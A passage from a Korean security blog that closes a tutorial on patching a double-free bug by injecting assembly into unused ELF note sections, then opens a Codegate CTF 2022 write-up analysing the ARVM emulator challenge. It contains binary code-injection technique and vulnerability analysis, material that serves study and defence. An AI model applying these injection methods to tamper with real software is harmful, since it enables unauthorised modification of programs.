BYREF</span></span><br><span class="line"></span><br><span class="line">  s[<span class="number">17</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span> &amp;&amp; s[i]; ++i )</span><br><span class="line">          ;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt;= <span class="number">0xF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = add_data();</span><br><span class="line">          <span class="keyword">if</span> ( v5 )</span><br><span class="line">            s[i] = v5;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;byebye!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;i);</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">0xF</span> )</span><br><span class="line">LABEL_17:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;sorry, there is no data&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          delete_data(s[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>그런데 <code>delete_data</code> 함수는 단순히 <code>free</code> 함수를 호출하는 것 이외에 별다른 기능을 하지 않습니다. 또한 <code>main</code> 함수에서 <code>s[i]</code> 를 <code>NULL</code> 로 초기화하는 등의 조치를 하지 않고 있어, 해제한 힙 메모리를 다시 해제할 수 있는 double free 버그가 발생합니다. double free 버그를 악용하면 동적 메모리 할당자가 할당 시 임의 주소를 반환하도록 하는 프리미티브를 구성할 수 있습니다. 또한 경우에 따라 임의 읽기 및 쓰기나 코드 실행 취약점으로 연계할 수 있습니다.</p>
<p>다음은 바이너리에서 delete 메뉴를 두 번 선택하고 동일한 인덱스를 입력한 결과입니다. 동적 메모리 할당자 내부에서 double free 버그의 발생을 탐지하여 실행이 강제로 종료되었음을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">...</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt; 2</span><br><span class="line">index: 0</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt; 2</span><br><span class="line">index: 0</span><br><span class="line">free(): double free detected in tcache 2</span><br><span class="line">[1]    20241 IOT instruction  ./main</span><br></pre></td></tr></table></figure>
<p>double free 버그를 패치하기 위해서는 <code>free</code> 함수의 호출 이후 <code>s[i]</code> 가 해제된 힙 포인터를 저장하지 않도록 <code>NULL</code> 로 초기화하는 코드를 추가해야 합니다. 원칙적으로는 <code>free</code> 함수를 호출하기 이전에 <code>s[i]</code> 가 <code>NULL</code> 인지 검사하는 조건문 또한 필요하겠으나, 사실 glibc의 <code>free</code> 함수 구현체인 <code>__libc_free</code> 는 다음과 같이 인자로 주어진 포인터가 <code>NULL</code> 인 경우 아무 동작도 하지 않기 때문에 문제가 없습니다. 추가할 코드 길이도 단축할 겸 조건문은 생략하겠습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>패치를 위해 <code>main</code> 함수에서 delete 메뉴를 처리하는 부분을 살펴보겠습니다. <code>main+366</code> 에서 <code>s[i]</code> 의 값을 레지스터 <code>rax</code> 에 대입한 후, <code>main+374</code> 에서 레지스터 <code>rdi</code> 로 옮겨 <code>main+377</code> 에서 호출하는 <code>delete_data</code> 함수의 인자가 되도록 하고 있습니다. 패치에는 여러 방법이 있겠으나, 여기서는 <code>main+366</code> 에서 새로 삽입한 코드를 호출하여 <code>s[i]</code> 의 초기화와 <code>free</code> 함수 호출을 처리하도록 하겠습니다. 호출 이후 <code>main+382</code> 의 분기까지는 <code>nop</code> 로 덮어 기존의 인스트럭션을 무시하도록 합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">...</span><br><span class="line">   0x000000000000161c &lt;+342&gt;:   call   0x11a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001621 &lt;+347&gt;:   mov    eax,DWORD PTR [rbp-0x9c]</span><br><span class="line">   0x0000000000001627 &lt;+353&gt;:   cmp    eax,0xf</span><br><span class="line">   0x000000000000162a &lt;+356&gt;:   ja     0x1649 &lt;main+387&gt;</span><br><span class="line">   0x000000000000162c &lt;+358&gt;:   mov    eax,DWORD PTR [rbp-0x9c]</span><br><span class="line">   0x0000000000001632 &lt;+364&gt;:   mov    eax,eax</span><br><span class="line">   0x0000000000001634 &lt;+366&gt;:   mov    rax,QWORD PTR [rbp+rax*8-0x90]</span><br><span class="line">   0x000000000000163c &lt;+374&gt;:   mov    rdi,rax</span><br><span class="line">   0x000000000000163f &lt;+377&gt;:   call   0x1450 &lt;delete_data&gt;</span><br><span class="line">   0x0000000000001644 &lt;+382&gt;:   jmp    0x16f4 &lt;main+558&gt;</span><br></pre></td></tr></table></figure>
<p>새로운 코드를 삽입하기 전 먼저 섹션 헤더와 세그먼트 헤더를 수정하여 코드를 삽입할 공간이 실행 가능한 영역으로 로드되도록 해야 합니다. 섹션 헤더와 세그먼트 헤더를 수정하기 위해서는 바이너리의 섹션 헤더 테이블과 프로그램 헤더 테이블에서 해당하는 부분을 직접 고쳐야 합니다. 상용 프로그램인 010 Editor의 템플릿 기능을 사용하는 방법이 가장 빠르긴 하나, 바이너리를 파싱하여 편집할 수 있도록 도와주는 무료 웹페이지를 사용하는 방법도 못지 않게 간편합니다.</p>
<p><div class="link-preview-widget"><a href="https://elfy.io/" rel="noopener" target="_blank"><div class="link-preview-widget-title">elfy.io | ELF viewer and editor Online</div><div class="link-preview-widget-description">ELF viewer and editor</div><div class="link-preview-widget-url"></div></a><a class="link-preview-widget-image" href="https://elfy.io/" rel="noopener" style="background-image: url('');" target="_blank"></a></div></p>
<p>페이지 좌상단의 Open 버튼을 클릭하여 바이너리를 업로드한 후, 왼쪽의 Section headers 메뉴를 클릭하면 섹션 헤더들이 나열됩니다. 이들 중 Elf_Shdr3 , Elf_Shdr4 섹션 헤더가 코드를 삽입할 <code>.note.gnu.build-id</code> , <code>.note.ABI-tag</code> 섹션에 해당합니다. 각각의 필드를 클릭하면 아래와 같이 페이지 우측에 헥스 에디터와 같은 인터페이스가 표시됩니다.</p>
<p><img src="/images/binary-patching/7.png" alt="7.png"></p>
<p>인터페이스의 edit 버튼을 클릭하여 바이트 단위로 편집하고, commit 버튼을 클릭하면 바이너리에 반영할 수 있습니다. 이전 문단의 그림과 같이 <code>.note.gnu.build-id</code> , <code>.note.ABI-tag</code> 섹션 헤더의 <code>sh_type</code> 과 <code>sh_flags</code> 필드를 각각 <code>SHT_PROGBITS</code> , <code>SHF_ALLOC | SHF_EXECINSTR</code> 로 변경합니다. 변경해야 할 값은 섹션 헤더와 프로그램 헤더를 소개한 문단에서 <code>/usr/include/elf.h</code> 파일에 정의된 내용을 참고하면 됩니다.</p>
<p>동일한 방법으로 Elf_Phdr8 프로그램 헤더의 <code>p_type</code> 필드와 <code>p_flags</code> 필드를 <code>PT_LOAD</code> , <code>PF_R | PX_X</code> 로 변경합니다. 변경을 마친 후 페이지 좌상단의 Save 버튼을 클릭하면 수정사항이 반영된 바이너리를 내려받을 수 있습니다. readelf로 섹션과 세그먼트를 조사해 보면 잘 변경되었음을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf --sections --wide .\main.patched.1</span><br><span class="line">There are 31 section headers, starting at offset 0x3978:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        0000000000000318 000318 00001c 00   A  0   0  1</span><br><span class="line">  [ 2] .note.gnu.property NOTE            0000000000000338 000338 000030 00   A  0   0  8</span><br><span class="line">  [ 3] .note.gnu.build-id PROGBITS        0000000000000368 000368 000024 00  AX  0   0  4</span><br><span class="line">  [ 4] .note.ABI-tag     PROGBITS        000000000000038c 00038c 000020 00  AX  0   0  4</span><br><span class="line">...</span><br><span class="line">$ readelf --segments --wide .\main.patched.1</span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x11c0</span><br><span class="line">There are 13 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align</span><br><span class="line">  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0002d8 0x0002d8 R   0x8</span><br><span class="line">  INTERP         0x000318 0x0000000000000318 0x0000000000000318 0x00001c 0x00001c R   0x1</span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br><span class="line">  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000950 0x000950 R   0x1000</span><br><span class="line">  LOAD           0x001000 0x0000000000001000 0x0000000000001000 0x000709 0x000709 R E 0x1000</span><br><span class="line">  LOAD           0x002000 0x0000000000002000 0x0000000000002000 0x000238 0x000238 R   0x1000</span><br><span class="line">  LOAD           0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002b0 0x0002d0 RW  0x1000</span><br><span class="line">  DYNAMIC        0x002d70 0x0000000000003d70 0x0000000000003d70 0x0001f0 0x0001f0 RW  0x8</span><br><span class="line">  NOTE           0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8</span><br><span class="line">  LOAD           0x000368 0x0000000000000368 0x0000000000000368 0x000044 0x000044 R E 0x4</span><br></pre></td></tr></table></figure>
<p>다음으로 삽입할 코드를 작성해 보겠습니다. 삽입할 코드는 <code>delete_data</code> 함수를 대신하여 호출되며, 이 코드에서 수행해야 할 작업을 의사코드로 나타내면 다음과 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(s[i]);</span><br><span class="line">s[i] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>따라서 다음과 같이 어셈블리 코드로 옮길 수 있습니다. <code>call</code> 인스트럭션은 이후 opcode로 옮길 때 인스트럭션의 위치와 <code>free@plt</code> 의 상대적인 오프셋을 인자로 전달해야 하므로, <code>call 0xd86</code> 이 되어야 함에 유의합니다.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lea</span> <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + <span class="built_in">rax</span>*<span class="number">8</span> - <span class="number">0x90</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span> free@plt</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
<p>어셈블리 코드를 위에서 사용한 온라인 어셈블러 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">웹페이지</a>에서 opcode로 옮긴 후, 헥스 에디터를 이용해 <code>.note.gnu.build-id</code> 섹션의 위치인 오프셋 <code>0x368</code> 에 덮어씁니다. 또한 <code>main+366</code> 부터 <code>main+382</code> 까지는 삽입한 코드를 호출하는 <code>call</code> 인스트럭션과 <code>nop</code> 인스트럭션으로 덮어씁니다. 패치된 바이너리를 디스어셈블하면 최종적으로 다음과 같아야 합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">...</span><br><span class="line">   0x000000000000161c &lt;+342&gt;:   call   0x11a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001621 &lt;+347&gt;:   mov    eax,DWORD PTR [rbp-0x9c]</span><br><span class="line">   0x0000000000001627 &lt;+353&gt;:   cmp    eax,0xf</span><br><span class="line">   0x000000000000162a &lt;+356&gt;:   ja     0x1649 &lt;main+387&gt;</span><br><span class="line">   0x000000000000162c &lt;+358&gt;:   mov    eax,DWORD PTR [rbp-0x9c]</span><br><span class="line">   0x0000000000001632 &lt;+364&gt;:   mov    eax,eax</span><br><span class="line">   0x0000000000001634 &lt;+366&gt;:   call   0x368</span><br><span class="line">   0x0000000000001639 &lt;+371&gt;:   nop</span><br><span class="line">   0x000000000000163a &lt;+372&gt;:   nop</span><br><span class="line">   0x000000000000163b &lt;+373&gt;:   nop</span><br><span class="line">   0x000000000000163c &lt;+374&gt;:   nop</span><br><span class="line">   0x000000000000163d &lt;+375&gt;:   nop</span><br><span class="line">   0x000000000000163e &lt;+376&gt;:   nop</span><br><span class="line">   0x000000000000163f &lt;+377&gt;:   nop</span><br><span class="line">   0x0000000000001640 &lt;+378&gt;:   nop</span><br><span class="line">   0x0000000000001641 &lt;+379&gt;:   nop</span><br><span class="line">   0x0000000000001642 &lt;+380&gt;:   nop</span><br><span class="line">   0x0000000000001643 &lt;+381&gt;:   nop</span><br><span class="line">   0x0000000000001644 &lt;+382&gt;:   jmp    0x16f4 &lt;main+558&gt;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/5i 0x368</span><br><span class="line">   0x368:       lea    rax,[rbp+rax*8-0x90]</span><br><span class="line">   0x370:       mov    rdi,QWORD PTR [rax]</span><br><span class="line">   0x373:       mov    QWORD PTR [rax],0x0</span><br><span class="line">   0x37a:       call   0x1100 &lt;free@plt&gt;</span><br><span class="line">   0x37f:       ret</span><br></pre></td></tr></table></figure>
<p>패치된 바이너리는 동일한 구조체를 연속으로 해제하려 시도하여도 동적 메모리 할당자에 의해 강제 종료되지 않습니다. 따라서 double free 버그로 인해 발생한 취약점이 잘 보완되었음을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./main.patched</span><br><span class="line">...</span><br><span class="line">&gt; 2</span><br><span class="line">index: 0</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt; 2</span><br><span class="line">index: 0</span><br><span class="line">1. add data</span><br><span class="line">2. delete data</span><br><span class="line">3. show data</span><br><span class="line">4. exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>바이너리 패치는 소스 코드가 없는 바이너리의 동작을 변형해야 하는 상황에서 유용합니다. 패치를 위해서는 디스어셈블러로 패치할 인스트럭션의 위치와 정확한 형태를 먼저 파악한 후, 헥스 에디터로 직접 편집하거나 코드를 삽입한 후 삽입된 코드를 호출하도록 해야 합니다. 코드 삽입에는 섹션 헤더와 프로그램 헤더를 수정하여 실행에 직접적으로 필요하지 않는 섹션을 사용하였으며, 바이너리의 취약점을 패치로 보완하는 실습을 통해 실제로 코드를 삽입하고 실행 흐름을 변형하는 것이 가능함을 확인하였습니다.</p>
<h2 id="%EC%B0%B8%EA%B3%A0%EB%AC%B8%ED%97%8C" tabindex="-1">참고문헌</h2>
<p>[1] D. Andriesse, “Chapter 2: The ELF Format,” in <em>Practical Binary Analysis</em>. San Francisco, CA: No Starch Press, 2019, pp. 31-55.<br>
[2] D. Andriesse, “Chapter 7: Simple Code Injection Techniques,” in <em>Practical Binary Analysis</em>. San Francisco, CA: No Starch Press, 2019, pp. 155-187.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>Reverse Engineering</category>
      </categories>
  </entry>
  <entry>
    <title>[Codegate CTF 2022] ARVM</title>
    <url>/2022/07/03/codegate22-arvm/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>Welcome! Here is my Emulator. It can use only human.<br>
Always SMiLEY :)</p>
</blockquote>
<p><a href="/uploads/codegate22-arvm/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>32비트 ARM 바이너리 <code>app</code> 과 <code>Dockerfile</code> , <code>run.sh</code> 등이 주어집니다. <code>run.sh</code> 파일에서 바이너리는 <code>qemu-arm-static</code> 으로 에뮬레이션하여 실행됨을 확인할 수 있습니다. 바이너리는 심볼이 strip되어 있고, NX, canary 보호 기법이 적용되어 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 코드를 입력받고, 3가지의 메뉴가 주어집니다. 코드를 입력하고 '1. Run Code’를 선택하면 바이너리가 출력하는 Secret code를 똑같이 입력해야 하는데, 앞서 코드로 “111” 을 입력했더니 “Instruction 0xa31313131 is invalid” 메시지와 함께 종료됩니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app</span><br><span class="line">Running Emulator...</span><br><span class="line">Welcome Emulator</span><br><span class="line">Insert Your Code :&gt; 111</span><br><span class="line">1. Run Code</span><br><span class="line">2. View Code</span><br><span class="line">3. Edit Code</span><br><span class="line">:&gt; 1</span><br><span class="line">Before run, it has some captcha</span><br><span class="line">Secret code : 0x52bae0cd</span><br><span class="line">Code? :&gt; 0x52bae0cd</span><br><span class="line">Instruction 0xa313131 is invalid</span><br></pre></td></tr></table></figure>
<p><code>main</code> 함수를 살펴보면 다음과 같습니다. 13행에서 <code>setup</code> 함수를 호출하여 필요한 구조체와 메모리를 할당하고, 17행에서 <code>edit_code</code> 함수를 호출하여 코드를 입력받습니다. 53행에서 호출하는 <code>check_code</code> 함수의 리턴값이 -1이 아니면 56~61행에서 입력한 코드를 실행하는데, <code>R0</code> 부터 <code>R12</code> 까지 모두 0으로 초기화하는 코드를 앞에 덧붙인 후 실행합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> captcha; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [sp+8h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [sp+Ch] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+1Ch] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;_stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( setup() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">16u</span>);</span><br><span class="line">    choice = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )                          <span class="comment">// 1. Run Code</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )                          <span class="comment">// 2. View Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )                     <span class="comment">// 3. Edit Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  captcha = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  read(fd, &amp;captcha, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before run, it has some captcha&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Secret code : 0x%x\n&quot;</span>, captcha);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Code? :&gt; &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;0x%x&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( captcha != input )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are Robot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( check_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good! Now Execute Real Machine&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(em-&gt;code, <span class="number">0</span>, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(em-&gt;code, &amp;clear_regs_code, <span class="number">52u</span>);      <span class="comment">// mov &#123;r0-r12&#125;, 0</span></span><br><span class="line">  v0 = <span class="built_in">memcpy</span>(em-&gt;code + <span class="number">52</span>, dest, <span class="number">4044u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))em-&gt;code)(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setup</code> 함수는 <code>emulator</code> 구조체 변수 <code>em</code> 과 <code>reg</code> 구조체, 각종 메모리를 할당합니다. <code>emulator</code> 구조체는 <code>mmap</code> 시스템 콜로 할당한 코드, 힙, 스택 역할을 하는 메모리의 주소와 <code>reg</code> 구조체 포인터를 멤버로 가집니다. <code>reg</code> 구조체는 범용 레지스터들과 <code>CPSR</code> 레지스터 역할을 하는 정수형 변수 17개를 멤버로 가집니다. 할당 이후 <code>em-&gt;reg-&gt;pc</code> , <code>em-&gt;reg-&gt;sp</code> 를 각각 <code>em-&gt;code</code> , <code>em-&gt;stack</code> 으로 초기화합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup</span><span class="params">()</span> <span class="comment">// 0x1088c</span></span><br><span class="line">&#123;</span><br><span class="line">  emulator *v1; <span class="comment">// r4</span></span><br><span class="line">  emulator *v2; <span class="comment">// r4</span></span><br><span class="line">  emulator *v3; <span class="comment">// r4</span></span><br><span class="line">  emulator *v4; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  em = (emulator *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">16u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = em;</span><br><span class="line">  v1-&gt;code = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">4096u</span>, <span class="number">7</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;code )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = em;</span><br><span class="line">  v2-&gt;heap = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x2000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;heap )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = em;</span><br><span class="line">  v3-&gt;<span class="built_in">stack</span> = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x3000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;<span class="built_in">stack</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = em;</span><br><span class="line">  v4-&gt;reg = (<span class="keyword">struct</span> reg *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">68u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;reg )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;code;</span><br><span class="line">  em-&gt;reg-&gt;sp = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">emulator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">reg</span> *<span class="title">reg</span>;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">char</span> *heap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sp, lr, pc, cpsr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
